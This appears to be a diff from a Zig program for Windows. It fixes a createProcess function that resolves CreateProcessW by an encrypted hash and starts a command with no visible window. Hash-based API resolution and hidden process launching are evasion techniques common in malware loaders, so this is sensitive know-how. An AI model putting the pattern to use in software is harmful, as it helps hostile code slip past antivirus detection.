@@ -22,10 +22,9 @@ fn createProcess(cmd: []const u16) bool {
     const kernel32 = loadKernel32() orelse return false;
     const createProc = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
     const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, ih: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(createProc));
-    var si: [68]u8 = undefined;
-    @memset(&si, 0);
-    var pi: [16]u8 = undefined;
-    @memset(&pi, 0);
+    var si = std.mem.zeroes(types.STARTUPINFOW);
+    si.cb = @sizeOf(types.STARTUPINFOW);
+    var pi = std.mem.zeroes(types.PROCESS_INFORMATION);
     return CreateProcessW(null, @constCast(@as([*:0]const u16, @ptrCast(cmd.ptr))), null, null, 0, 0x08000000, null, null, @ptrCast(&si), @ptrCast(&pi)) != 0;
 }
 
